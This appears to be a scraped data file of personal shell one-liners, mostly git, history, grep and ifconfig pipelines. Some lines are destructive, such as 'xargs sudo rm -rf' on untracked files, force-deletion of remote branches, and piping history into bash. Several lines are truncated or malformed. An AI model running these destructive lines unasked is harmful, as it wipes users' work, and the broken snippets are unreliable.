"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d "" "" -f2"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d "" "" -f 2"
"ifconfig | grep ""inet "" | grep -v ""inet 127.0.0.1"" | cut -f 2 -d "" """
"ifconfig | grep ""inet "" | grep -v ""127.0.0.1"" | cut -d"" "" -f2"
"ifconfig | grep ""inet "" | grep -v ""127.0.0.1"" | awk ""{print \$2}"""
"ifconfig | grep ""inet "" | grep -Fv 127.0.0.1 | awk '{print $2}'"
"ifconfig | grep ""inet "" | grep -Fv 127.0.0.1 | awk "
"ifconfig | grep "".*Bcast"" | grep -o ""addr:[0-9\.]*"" | grep -o ""[0-9\.]*"""
"ifconfig | egrep ""inet "" | grep -v 127.0.0.1 | cut -d "" "" -f 2"
"ifconfig | cut -d "" "" -f 1 | cut -d: -f1 | uniq -u"
"ifconfig wlan0 | grep ""inet\ addr"" | cut -d: -f2 | cut -d"" "" -f1"
"ifconfig wlan0 | grep ""HWaddr"" | cut -dH -f2 | cut -c7-23"
"ifconfig eth1 | grep ""inet addr"" | cut -d: -f2 | awk ""{print \$1}"""
"ifconfig eth0|grep ""RX bytes""|sed ""s/.*RX bytes://""|sed ""s/ (.*//"""
"ifconfig eth0 | grep ether | sed ""s/ *\t*ether //"" | env grep -o -E ""([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}"""
"ifconfig eth0 | grep ""inet\ addr"" | cut -d: -f2 | cut -d"" "" -f1"
"ifconfig eth0 | grep ""inet adr:"" | cut -d: -f2 | awk ""{ print $1}"""
"ifconfig eth0 | grep ""inet addr:"" | cut -d: -f2 | cut -d"
"ifconfig eth0 | grep ""HWaddr"" | cut -dH -f2 | cut -c7-23"
"ifconfig en0|grep inet|grep -v inet6|cut -d"" "" -f2"
"ifconfig en0 | grep inet\ | grep -E '(\d{1,3}\.){3}\d{1,3}' | awk '{print $2}'"
"ifconfig en0 | grep inet | grep -v inet6 | awk ""{print \$2}"""
"ifconfig en0 | grep inet | grep -v inet6 | awk ""{print $2}"""
"ifconfig en0 | grep ""inet "" | grep -v 127.0.0.1 | cut -d\ -f2"
"ifconfig -a | grep -o ‘inet6\? \(addr:\)\?\s\?\(\(\([0–9]\+\.\)\{3\}[0–9]\+\)\|[a-fA-F0–9:]\+\)’ | awk ‘{ sub(/inet6? (addr☺? ?/, \”\”); print }’"
"ifconfig -a | grep -o 'inet\s\(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet\s(addr:)? ?/, \"
"ifconfig -a | grep -o 'inet6\\? \\(addr:\\)\\?\\s\\?\\(\\(\\([0-9]\\+\\.\\)\\{3\\}[0-9]\\+\\)\\|[a-fA-F0-9:]\\+\\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | \
"ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\3\[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk ' sub(/inet6? (addr:)? ?/, \"
"ifconfig -a | grep -o ""inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)"" | awk ""{ sub(/inet6? (addr:)? ?/, \""\""); print }"""
"ifconfig -a | /usr/bin/grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"i=0; start=$(date ""+%s""); while true; do ((i++)); bad=$(sudo grep -Po ""protocol=h2, code=[^2]\d+"" $LOG*|wc -l); good=$(sudo grep -Po ""protocol=h2, code=[2]\d+"" $LOG*|wc -l); response_total=$(($bad + $good)); curl_total=$(sudo grep ""sendAlertsToAPNS.html"" $LOGDIR/localhost_access*|wc -l); missing=$(($curl_total - $response_total)); now=$(date ""+%s""); elapsed=$(($now - $start)); if [ $elapsed -gt 60 ]; then str=$(printf ""%s minutes %s seconds"" $(($elapsed / 60)) $(($elapsed % 60))); else str=""$elapsed seconds""; fi; printf ""$i. bad:%s, good:%s, respnse total:%s, curl total:%s, missing:%s, elapsed:%s\n"" $bad $good $response_total $curl_total $missing ""$str""; sleep 10s; done;"
"i3-nagbar -m ""[$?] Job Completed ($( echo -n $( history | tail -n2 | head -n1 | cut -d\ -f 4- ) )"")"
"hugo serve --buildDrafts | h -i ""ERROR|failed"" //localhost: /Users/axel/com/HUGO/ content created copied unable draft rendered total path ""watching|serving"" "
"hub pull-request -h sendgrid:`git branch -q | grep ""*"" | awk ""{print $2}"" | cut -d"" "" -f 2`"
"hub pr list | fzf | egrep -o ""\d+"" | xargs hub pr checkout"
"hub issue |grep $(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g"") | sed -e ""s/\W(.*//"" -e ""s/.*]//"""
"hub browse $(ghq list | grep github.com | cut -f 2,3 -d / | peco)"
"hub browse $(ghq list | grep ""github.com"" | peco | cut -d ""/"" -f 2,3)"
"hub browse $(ghq list | grep ""github.com"" | peco --prompt ""[github]"" | cut -d ""/"" -f 2,3)"
"hub browse $(find ~/src -follow -maxdepth 3 -mindepth 3 -type d | cut -d ""/"" -f 5- | fzf | cut -d ""/"" -f 2,3)"
"hours | awk -F',' '{ print \$4 }' | paste -sd+ - | bc"
"history|tail -n1|sed -e ""s/^\s*[0-9]\+\s*//;s/;\s*tshalert$//""|wall"
"history | tail -n2 | head -n1 | cut -d"" "" -f7- >> ~/process.sh "
"history | tail -1 | grep -oP ""^\s*[0-9]+\s\s\K.*"" | xsel -ib && xsel -ob "
"history | sed ""s/^ \+[^ ]* \(.*\)/\1/"" | fzf -m --tac -0 | vim - "
"history | sed ""s/^ \+[^ ]* \(.*\)/\1/"" | fzf --tac | bash - "
"history | perl -pe ""s:^\s*\d+\s+(.+):\1:"" | sort -u | command grep --color -iP"
"history | peco | awk ""{ gsub(/ +[0-9]+/,\""\"" ); print }"" | bash"
"history | grep -v -E ""grep|history\?"" | grep ""$@"""
"history | grep -v -E ""grep|h\?"" | grep ""$@"" -i --color=auto"
"history | grep ""sudo apt"" | grep ""install"" | grep -v ""grep"""
"history | fzf -q test --preview=""which {}"" | awk ""{print $2}"" | xargs -r swaymsg -t command exec"
"history | dm | sed -nE -e ""s/^\s*([0-9]+\s+)(.*\S)\s*/\2/p"" | xx"
"history | awk '{usage[\$2]+=1}END{for(key in usage){print key, usage[key]}}' | sort -nrk 2 | head"
"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head"""
"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head"
"history | awk ""{print \$2}"" | sort -u | column --"
"history | awk ""{print $2}"" | awk ""BEGIN {FS=""|""}
"history | awk ""{a[\$2]++}END{for(i in a){print a[i] \"" \"" i}}"" | sort -rn | head"
"history -n && history -d `history|tac|fzf -e|awk ""{print \$1}""` && history -w"
"hg status --ignored --unknown | awk ""( \$1 == \""?\"" ) || ( \$1 == \""I\"") { print \$2 }"" "
"hg st | grep .py | cut -f 2 -d "" "" | xargs flake8 --ignore=""E501,E122,E128"""
"hg st | grep -v -E ""(^\? build|\.(iml|class)$)"""
"hg st -i | grep -v target/ | grep -v /overlays/ | sed -e ""s/I //g"""
"hg shelve --list | cut -f 1 -d "" "" -d ""("" | xargs -n 1 hg shelve --patch --color=always | less"
"heroku apps | grep -v ""^\(===\|$\)"" | cut -d"" "" -f1"
"head -c 4 /dev/random | od -D | awk ""{print \$2}"" | head -n1"
"head -1 | xargs -r -i printf %q ""{}"" | tee /dev/tty | pbcopy"
"gt branch | grep -v master | grep -v ""*"" | xargs git branch -d"
"gst | grep modified | cut -f2 -d ' ' | xargs autopep8 --in-place --select E226,E261,E231,W601,E265,E302,E303,E225,E302,E701,W293,E265,E301,E241"
"gss | grep -P ""^\t"" | cut -f2 | xargs rm -r"
"gs | grep ""modified: "" || go"
"grepc ""(//\s*FIXME)|(--\s*FIXME)|(/\*\s*FIXME\s*\*/)|(#\s*FIXME)"""
"grep radio= ~/.mplayer/config | cut -d= -f6 | tr -- , '\n' | cat -n"
"grep -v -E ""(libexec|System|-bash|sbin)"""
"grep -v ""Binary file"" | cut -d "":"" -f 1 | uniq | xargs vim -O"
"grep -o 'i-\S*' | paste -sd ' ' | sed 's/ /,/g' | (echo -n '-S ' && cat)"
"grep -nr TODO: . | sed ""s/ *\/\///g"" | sed ""s/TODO://"" | nl"
"grep -iP ""(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(?>\.(?1)){3}"""
"grep -iE ""warn|fail|error|fatal"""
"grep -hr '.. tags::' 201{3,4} | sed -e 's/.. tags:: //' -e 's/,/\n/g' | sort | uniq"
"grep -hr '.. categories::' 201{3,4} | sed -e 's/.. categories:: //' -e 's/,/\n/g' | sort | uniq"
"grep -hoR ""\$flipper\[:\(\w\+\)]"" --exclude-dir=tmp --exclude-dir=log --exclude-dir=node_modules --exclude-dir=coverage --color=none err.txt generated.file succ.txt | sort -u | cut -d ""["" -f2 | cut -d ""]"" -f1"
"grep -e ""^-"" $TODO | grep -ve ""\(@someday\|@cancelled\|@done\)"""
"grep -Fxq ""fs.inotify.max_user_watches=524288"" /etc/sysctl.conf || echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p"
"grep --recursive --only-matching --no-filename --ignore-case --binary-files=without-match --exclude-dir=""tmp"" ""[а-я]*"" err.txt generated.file succ.txt | aspell --list | sort| uniq"
"grep '^ *kVK' /System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/Headers/Events.h|tr -d ,|while read x y z;do printf '%d %s %s\n' $z $z ${x#kVK_};done|sort -n"
"grep ""Failed password for"" /var/log/auth.log | grep -Po ""[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"" \| sort | uniq -c"
"grep ""ERROR\|FATAL\|Exception"" $FUSIONWORKS_HOME/UnifiedLogging/UL_* | more"
"grep ""Apr"" /var/log/syslog | cut -d\ -f1,2,3 | cut -d: -f1,2 | uniq"
"grep ""<a href="" | sed ""s/^.*<a href=//"" | sed ""s/>.*$//"" | tr -d \"""
"grep ""$(echo -n $(pwd|cut -d/ -f5) | sha1sum |awk ""{print \$1}"")"" /var/log/mail.log*"
"grep ""!"" conf/gitignore | grep -v ""*"" | tr -d ""!"" | xargs tar -czf config.tgz"
"grc $( (alias ""$1"" 2>/dev/null || echo ""$1"") | cut -d\"
"gpa_startbranch=$(git describe --contains --all HEAD) ; git fetch --all ; for x in $(git branch -vv | grep ""\origin"" | tr -d ""*"" | awk "
"gone | tr -s "" "" | cut -d "" "" -f 2 | xargs -I % git branch -D %"
"go test $(go list ./... | grep -v ""/\(vendor\|cmd\|etc\)/"")"
"gnokii --getphonebook SM 1 end 2> /dev/null | while read line; do if [ ! -z ""$(echo ""$line"" | grep ""Name"")"" ]; then echo -n ""$line, ""; elif [ ! -z ""$(echo ""$line"" | grep ""Number"")"" ]; then echo $line; fi; done"
"gmake x64Linux3gcc5.4.0 2>&1 1>/dev/null | grep -v -E ""echoModules|metamodule.mk"" | colorize"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n7"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n6"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n5"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n4"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n3"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n2"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n10"
"gls -tl | awk ""{print \$6, \$7, \$8, \$9}"" | column -t | head -n1"
"glo | fzf --ansi --no-sort | cut --delimiter="" "" --fields=1 | xargs --no-run-if-empty git show"
"glo | fzf --ansi --no-sort | cut --delimiter="" "" --fields=1 | xargs --no-run-if-empty git revert"
"glo | fzf --ansi --no-sort | cut --delimiter="" "" --fields=1 | xargs --no-run-if-empty -I % bash -c ""</dev/tty git rebase --interactive %"""
"gl --author=""Zhong Chen"" --pretty=format:%s4m | grep -oE ""^SUMO-[0-9]+"" | head -1 | pbcopy"
"gits | grep modified | cut -d "":"" -f2 | cut -d ""("" -f1"
"gitmoji -l|fzf|rg -o "":.*:""|pbcopy"
"git-list-branches | grep -v ""master\|$(current-git-branch)"" | xargs git branch -D"
"git tag | grep ""^[0-9]\{4\}\.[0-9][0-9]\.[0-9][0-9]\.[0-9][0-9]$"" | sort | tail -n 1"
"git status | tr ""\n"" ""x9221"" | sed ""s/Untracked.*$//g"" | tr ""x9221"" ""\n"""
"git status | grep modified | cut -f2 -d: | xargs git commit -m ""nightly upload""; git push"
"git status | grep geändert | cut -d "":"" -f2 | xargs git checkout"
"git status | grep deleted | awk ""{print \$3}"" | xargs git rm"
"git status | grep ""modified:"" | awk ""{print \$2}"" | xargs git add"
"git status | grep ""modified"" | cut -d: -f2 | xargs -n 1 git add"
"git status | grep ""modified"" | awk ""{print \$2}"" | xargs -I{} git checkout -- {}"
"git status | grep ""mod\|Pull\|branch"""
"git status | grep ""_spec.rb"" | cut -f4 -d"" "" | xargs bundle exec rspec"
"git status | grep ""^\!"" | awk ""{print \$2}"" | xargs svn delete"
"git status | grep ""On branch "" | awk ""{print \$NF}"" | xargs git push origin"
"git status | egrep -v ""rej|orig|TAGS"""
"git status | egrep ""both (added|modified)"" | awk "
"git status -s|& grep "" M \|A \| D """
"git status -s | rg ""\?\?"" | cut -c 4- | xargs trash"
"git status -s | grep -v tests | cut -f 3 -d "" "" | xargs pep8 --max-line-length=120"
"git status -s | grep -e ""^\?\?"" | grep -v "".gitignore"" | cut -c 4- >> .gitignore"
"git status -s | grep ""^ D"" | cut -f 3 -d "" "" | xargs -I % git rm %"
"git status -s | grep ""^ D"" | awk ""{print $2}"" | xargs git rm"
"git status -s | cut -c4- | grep ""\.rb"" | xargs rubocop"
"git status -s | cut -c4- | grep ""\.rb"" | xargs rubocop -a"
"git status -s . | grep ""^??"" | cut -c4- | while read f; do rm -f ""$f""; done"
"git status -s . | grep ""^??"" | cut -c4- | while read f; do git add ""$f""; done"
"git status -s . | grep ""^!!"" | cut -c4- | while read f; do git delete ""$f""; done"
"git status --untracked-files=no | \grep -Ev ""deleted|gitignore|__init__.py"""
"git status --short | grep ""^AA"" | cut -d "" "" -f2 | xargs vim"
"git status --short | grep ""??"" | cut -d "" "" -f 2 | xargs rm"
"git status --porcelain | q ""select c2 from -"" | grep xls | xargs git checkout"
"git status --porcelain | grep -E ""^\?\?\s"" | sed ""s/\??\s//g"" | xargs sudo rm -rf"
"git status --porcelain | grep ""^?? "" | cut -c4- | xargs git add"
"git status --porcelain | grep ""^?? "" | cut -c4- | xargs git add && git status --short --branch"
"git status --porcelain | grep ""^.M "" | cut -c4- | xargs git add"
"git status --porcelain | grep ""^.M "" | cut -c4- | xargs git add && git status --short --branch"
"git status --porcelain | grep ""^.D "" | cut -c4- | xargs git rm"
"git status --porcelain | grep ""^.D "" | cut -c4- | xargs git rm && git status --short --branch"
"git status --porcelain | grep ""^ D "" | sed ""s/^ D //"" | xargs git rm"
"git stash |grep -E ""No local changes to save$"" && a=0 || a=1 ; git submodule foreach ""(git pull --ff-only)"" 2>/dev/null ; git commit -am ""update submodules"" 1>/dev/null ; echo ""updated submodules"" ; [ ""$a"" -eq ""1"" ] && git stash pop 1>/dev/null"
"git stash list | peco | cut -d "":"" -f 1 | git stash pop"
"git stash list | fzf --no-sort | sed -n ""s/^stash@{\(.*\)}.*/\1/p"" | xargs --no-run-if-empty git stash show"
"git st | pe | fzf -m | xargs git add && clear && printf ""\e[3J"" && git st"
"git st . | grep modified | sed ""s/.*modified: //g"" | xargs git add ; git st"
"git show --diff-filter=AM --pretty="""" --name-only HEAD | grep --regex ""BUILD\|WORKSPACE"" | xargs buildifier"
"git s | awk ""/modified/ {print \$2}"" | xargs grep -E ""TODO|pdb"""
"git rev-parse HEAD | sed -e ""s/\(.\{7\}\).*/\1/"" | tr -d ""\n"" | pbcopy"
"git rev-parse --abbrev-ref HEAD 2>/dev/null | cut -d""/"" -f 2 | tr -d ""\n"" | pbcopy"
"git remote show origin -n | grep ""Fetch URL:"" | sed -E ""s#^.*/(.*).*/(.*)\$#\1/\2#"" | sed ""s#.git\$##"""
"git remote prune origin; git branch --merged | grep -v -E ""(\*|master)"" | xargs -n 1 git branch -d"
"git remote -v | head -1 | cut -f 2 | cut -d "" "" -f 1"
"git remote -v | awk ""NR==1{print \$2; exit}"" | sed s/.git$// | xargs open"
"git reflog | perl -pe ""s/\e\[?.*?[\@-~]//g"" | cut -c 1-7 | tig --stdin"
"git push || $(git push 2>&1 | grep ""git push --set-upstream"")"
"git push origin $1 2>&1 | tee >(grep -e https | sed ""s/remote: //g"" | pbcopy)"
"git push origin $(git branch -a | fzf --reverse | head -n 1 | sed -e ""s/^\*\s*//g"")"
"git push 2>&1 | grep git | sed -e ""$!d"" | xargs -ICMD bash -c ""CMD"""
"git pull && git branch --merged | grep -v ""\*"" | grep -v master | xargs -n 1 git branch -d"
"git merge --no-ff $(git branch -l | grep -vE ""^\*"" | tr -d "" "" | fzf)"
"git merge --no-ff $(git branch -l | grep -vE ""^\*"" | tr -d "" "" | fzf --preview ""git log --oneline --all --graph --decorate $(git rev-parse --abbrev-ref HEAD)..{}"")"
"git merge $(git tag | egrep ""\d+\.\d+\.\d+"" | gsort -rV | head -n1)"
"git ls-tree -l --abbrev=7 HEAD | tr -s ' ' ' ' | cut -f 2,3,4,5 -d ' ' --output-delimiter=' ' | sort -k 3dr,4.2"
"git ls-remote --heads | grep -iE ""\/hotfix-\d{4}$"" | cut -d""/"" -f3 | tail -n1"
"git ls-files | xargs notes | awk -F: '{ print \$1,\$2; print \$3,\$4; print \$5}' | grcat conf.notes"
"git ls-files | xargs file --mime-type | grep ""text/"" | cut -d: -f1"
"git ls-files | grep ""\.go$"" | xargs wc -l | sort -rn"
"git log | head -n 5 | sed -n '5,5p' | sed -e 's/ //g'"
"git log | head -n 1 | sed ""s/commit //"" | pbcopy"
"git log | head -1 | awk'{print substr(\$2,1,7)}' | pbcopy"
"git log | head -1 | awk '{print substr(\$2,1,7)}' | pbcopy"
"git log | head -1 | awk ""{print substr(\$2,1,7)}"" | pbcopy"
"git log | grep commit | grep -v ""first commit"" | wc -l"
"git log | grep -B 4 ""$*"" | head -n 1 | cut -d\ -f 2"
"git log -n 1 --format=""[`git branch|grep \*|cut -c3-` %h] %s"" | pbcopy"
"git log -M -C --format=""format:%aN"" --grep ""Revert"" | sort | uniq -c | sort -n"
"git log -20 --date=format:""%a %m-%d-%y %H:%M:%S"" --pretty=format:""%C(cyan)%h%Creset %Cgreen|%Creset %C(red)%<(12,trunc)%an%Creset %Cgreen|%Creset %C(yellow)%<(21)%ad%Creset %Cgreen|%Creset %<(50,trunc)%s"""
"git log --since=9/18/2011 --pretty=format:""%ad | %s"" --date=local |grep 330 |grep p2"
"git log --reverse | grep -v ""^commit"" | grep -v ""^Author"" | grep -v ""^Date"""
"git log --reverse -100 --format=""format:%Cgreen[BRANCHNAME %h]%Creset %s"" | (sed ""s/BRANCHNAME/$(git symbolic-ref -q --short HEAD || git describe --tags --exact-match)/"")"
"git log --reverse --format=""format:%Cgreen[BRANCHNAME %h]%Creset %s"" | (sed ""s/BRANCHNAME/$(git symbolic-ref -q --short HEAD || git describe --tags --exact-match)/"")"
"git log --pretty=format:'%C(yellow)%ad %Creset| %Cgreen%h %Creset| %Cblue%<(10,trunc)%an %Creset| %Cgreen%d %Creset%s' --date=short"
"git log --pretty=format:""%h | %an | %ad | %s %d "" --graph --date=short --date=local"
"git log --pretty=format:""%h %ai (%an) | %s"" --shortstat | ruby ~/Sites/personal/utilities/git-log-hoc.rb | less -RS"
"git log --pretty=format:""%h %C(bold)|%C(reset) %s %C(bold)|%C(reset) %C(yellow)%an%C(reset) %C(bold)|%C(reset) %C(green)%cr%C(reset)"""
"git log --pretty=format:""%h %C(bold)|%C(reset) %s %C(bold)|%C(reset) %C(yellow)%an%C(reset) %C(bold)|%C(reset) %C(green)%cr%C(reset)"" --max-count=100"
"git log --pretty=format:""%an"" | sort | uniq -c | sort -n"
"git log --pretty=format:""%ad | %C(yellow)%h%C(reset) | %an | %C(blue)%s%C(reset) (%ar)"" --date=""short"""
"git log --pretty=format:""%Cred%h%Creset|%Cgreen%ad%Creset|%Cgreen%cr%Creset|%C(bold blue)<%an>%Creset""\n""%C(yellow)%d%Creset %s"" --abbrev-commit --date=short"
"git log --pretty=format:""%C(yellow)%h|%Cred%ad|%Creset%an|%Cgreen%d %Creset%s"" --date=short"
"git log --pretty=format:""%C(yellow)%h|%Cred%ad|%Creset%an|%Cgreen%d %Creset%s"" --date=short --relative-date"
"git log --oneline | grep -E ""DAILYBUILD|(Import.+CXP)"" | head -n 1"
"git log --oneline -n 1 | grep -o ""\[.*\]"" | tr -d ""\n"" | pbcopy"
"git log --name-status staging.. |egrep ""^[MA].+spec.rb$"" |cut -f2 | uniq"
"git log --graph --pretty=format:'%h (%ad) %an: %s' --date=short | grep `date +%Y-%m-%d` | cut -d ':' -f 3- | paste -s -d ','"
"git log --graph --pretty=format:""%h %an"" | grep -vi ""$(git config user.name)"" | head -n1 | cut -d"" "" -f1"
"git log --graph --date=format-local:'%d.%m.%y %H:%M' --pretty=format:'%Cred%>|(15)%h %C(yellow)%<|(29,trunc)%an %C(green)%ad %C(yellow)%<|(60,trunc)%cn %C(green)%cd %C(bold blue)%d %Creset%s'"
"git log --date=iso --format=""%h %ai"" --name-only | sort | uniq -cd | sort -n"
"git log --date=format:""%a %m-%d-%y %H:%M:%S"" --pretty=format:""%C(cyan)%h%Creset %Cgreen|%Creset %C(red)%<(12,trunc)%an%Creset %Cgreen|%Creset %C(yellow)%<(21)%ad%Creset %Cgreen|%Creset %<(50,trunc)%s"""
"git log --color --stat |G -v ""Author\|Date"" |less"
"git log --color --pretty=format:""%C(bold blue)%an%C(reset)"" | sort | uniq -c | sort --reverse"
"git grep -n $1 | while IFS=: read i j k; do git blame -L $j,$j $i | grep -v -F -f 'current-employee-git-handles.txt' | cat; done"
"git fsck --unreachable | grep commit | cut -d"" "" -f3 | xargs git log --merges --no-walk --grep=WIP"
"git fsck --no-reflogs | sed ""s/^dangling \(commit\|blob\) //g"" | xargs git log --no-walk"
"git for-each-ref --sort=-committerdate refs/heads/ --format=""%(refname) %(committerdate)"" | sed ""s/refs\/heads\///g"" | column -t | head -n 15"
"git for-each-ref --sort=""-authordate:iso8601"" --format="" %(authordate:relative)%09%(refname:short)"" refs/heads | ipt --unquoted | cut -f2 | xargs git co"
"git fetch origin --prune && git branch --merged | grep -v ""\*"" | grep -v master | xargs -n 1 git branch -d"
"git fetch -p | git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"git fetch -p origin && git co master && git br -r --merged | grep -v master | sed -e ""s/.* origin\///g"" | xargs -n 1 git push origin --delete"
"git fetch -p origin && git co master && git br --merged | grep -v master | sed -e ""s/.* //g"" | xargs -n 1 git br -d"
"git fetch -p --all && git branch -vv | grep "":gone]"" | cut -d"" "" -f3 | xargs git branch -D"
"git fetch -p && git branch | grep -Ev ""master|dev"" | xargs -p git branch -d"
"git fetch -p && git branch --merged | grep -v ""\*"" | grep -v ""master"" | xargs -n 1 git branch -d && git gc --prune=now"
"git fetch -p && git branch --merged | grep -v ""\*"" | grep -v ""^master\$"" | xargs -n 1 git branch -d"
"git fetch -p && for branch in \`git branch -vv | awk '{print \$1,\$4}' | grep 'gone]' | awk '{print \$1}'\`; do git branch -d \$branch; done"
"git fetch --all -p; git branch -vv | grep gone | awk ""{print \$1}"" | xargs git branch -D"
"git fetch --all -p; git branch -vv | grep "": gone]"" | awk ""{ print $1 }"" | xargs -n 1 git branch -d"
"git fetch --all -p && git br --merged | grep -v ""\*"" | grep -v master | xargs -n 1 git branch -d"
"git fetch --all --prune && git branch | grep -v ""^*"" | grep -v ""^master$"" | xargs git branch -D"
"git fetch --all --prune && git branch -vv | grep ""origin/.*: gone]"" | awk ""{print $1}"" | xargs git branch -D"
"git fetch --all --prune && git branch -vv --no-color | grep ""\[.*: gone\]"" | awk ""{print \$1}"" | xargs git branch -D"
"git fetch && git branch --merged origin/master | grep -v ""^\s*master"" | grep -v ""^*"" | xargs git branch -D"
"git diff-tree --pretty="""" --no-commit-id --name-only -r `git log -1 --pretty=format:""%h"" --before=""yesterday""` 2>/dev/null | sed -e ""s/^/* /g"" || echo ""None"""
"git diff-tree --pretty="""" --no-commit-id --name-only -r `git log -1 --pretty=format:""%h"" --before=""today""` 2>/dev/null | sed -e ""s/^/* /g"" || echo ""None"""
"git diff-tree --no-commit-id --name-only -r `git log --pretty=format:""%h %ad %s (%an)"" --date=short| percol|sed -e""s/^\([a-z0-9]*\) .*$/\1/""` -r HEAD|xargs ${GREPCMD}"
"git diff | ack=""^([\+-]|diff)"" | less"
"git diff master | grep ""^\(+.*TODO\|+++\)"" | grep -B1 ""TODO"""
"git diff master --name-only | grep ""ex$\|exs$"" | xargs mix format"
"git diff --word-diff=porcelain origin/master | grep -e ""^-[^-]"" | wc -w | xargs"
"git diff --word-diff=porcelain origin/master | grep -e ""^+[^+]"" | wc -w | xargs"
"git diff --word-diff=porcelain develop | grep -e ""^-[^-]"" | wc -w | xargs"
"git diff --word-diff=porcelain develop | grep -e ""^+[^+]"" | wc -w | xargs"
"git diff --name-only | uniq | while read line ; do echo \""$line\"" ; done | xargs -o vim -p"
"git diff --name-only origin/master | grep "".py"" | xargs pep257 | grep -v ""line too"""
"git diff --name-only origin/master | grep "".py"" | xargs flake8 | grep -v ""line too"""
"git diff --name-only --diff-filter=U|grep ""\.html\|\.min\.js""|xargs -I{} sh -c ""git checkout --theirs {} && git add {}"""
"git diff --name-only --diff-filter=U|grep ""\.html\|\.min\.js""|xargs -I{} sh -c ""git checkout --our {} && git add {}"""
"git diff --name-only --cached | pick | xargs -I{} echo ""$(git rev-parse --show-toplevel)/{}"" | xargs git reset HEAD"
"git diff $(git status |grep ""modified:""|sed -e ""s/modified://g""|peco)"
"git diff ""$@"" | grep ""^[+-]"" | sort --key=1.2 | uniq -u -s1"
"git delete-branch $(git branch | grep -v ""master$"" | grep -v ""stage$"" | fzf)"
"git commit -m ""$(curl http://whatthecommit.com/ | grep -A1 content | tail -n 1 | cut -c 4-)"""
"git co master && git branch --merged | grep -v ""\*"" |grep -v ""master""| while read i;do git branch -d $i;git push origin :$i;done"
"git co `git b | fzf | sed -e ""s/\* //g"" | awk ""{print \$1}""`"
"git co $(git br --list --color=never | tr -s "" "" | cut -d"" "" -f2 | fzf-tmux)"
"git co $(git b | fzf | sed -e ""s/\* //g"" | awk ""{print \$1}"")"
"git co ""$(git branch -a | sed ""s/ //"" | grep -v ""^*"" | fzf)"""
"git checkout master && git pull --rebase origin master && git branch --merged origin/master | grep -v ""^\s*master"" | grep -v ""^*"" | xargs git branch -D"
"git checkout master && git pull && git branch --merged | egrep -v ""(^\*|master)"" | xargs git branch -d; git fetch --prune"
"git checkout master && git branch --merged | grep -v ""\*"" | grep -v master | xargs -n 1 git branch -d"
"git checkout master && git branch --merged | grep -v ""* master"" | grep -v ""qa"" | xargs git branch -d"
"git checkout master && comm -12 <(git branch | sed ""s/ *//g"") <(git remote prune origin | sed ""s/^.*origin\///g"") | xargs -L1 -J % git branch -D %"
"git checkout master && comm -12 <(git branch | sed ""s/ *//g"") <(git remote prune origin --dry-run | sed ""s/^.*origin\\///g"") | xargs -L1 -J % git branch -D %"
"git checkout master && comm -12 <(git branch | sed ""s/ *//g"") <(git remote prune --dry-run origin | sed ""s/^.*origin\///g"") | xargs -L1 -J % git branch -D %"
"git checkout `git branch | peco | sed -e ""s/\* //g"" | awk ""{print \$1}""`"
"git checkout `git branch | fzf | sed -e ""s/\* //g"" | awk ""{print \$1}""`"
"git checkout `git branch --all | peco | sed -e ""s/\* //g"" | awk ""{print \$1}""`"
"git checkout \$(gba | grep -v ""HEAD"" | peco | tr -d "
"git checkout $(git reflog | sed 1d | head -n 1 | cut -d"" "" -f1)"
"git checkout $(git reflog | grep checkout: -m 2 | tail -n1 | cut -d "" "" -f 8-)"
"git checkout $(git for-each-ref --format=""%(authorname) %09 %(refname:short)"" --sort=authorname | sed ""/origin/d"" | fzf | awk ""{print \$NF}"")"
"git checkout $(git branch | tr -d "" "" | tr -d ""*"" | peco)"
"git checkout $(git branch | sort -r | peco | sed -e ""s/* //"")"
"git checkout $(git branch | sed -e ""s/^\*\s*//g"" | awk ""{print $1}"" | peco --prompt ""GIT BRANCH >"")"
"git checkout $(git branch | sed ""s/*//g"" | sed ""s/ //g"" | peco)"
"git checkout $(git branch | sed ""s/*//g"" | sed ""s/ //g"" | peco --prompt ""CHECKOUT BRANCH >"")"
"git checkout $(git branch -l | grep -vE ""^\*"" | tr -d "" "" | fzf)"
"git checkout $(git branch -l | grep -vE ""^\*"" | tr -d "" "" | fzf --preview ""git log --oneline --all --graph --decorate $(git rev-parse --abbrev-ref HEAD)..{}"")"
"git checkout $(git --no-pager branch --no-color | awk ""{print $1}"" | grep -v \* | fzf)"
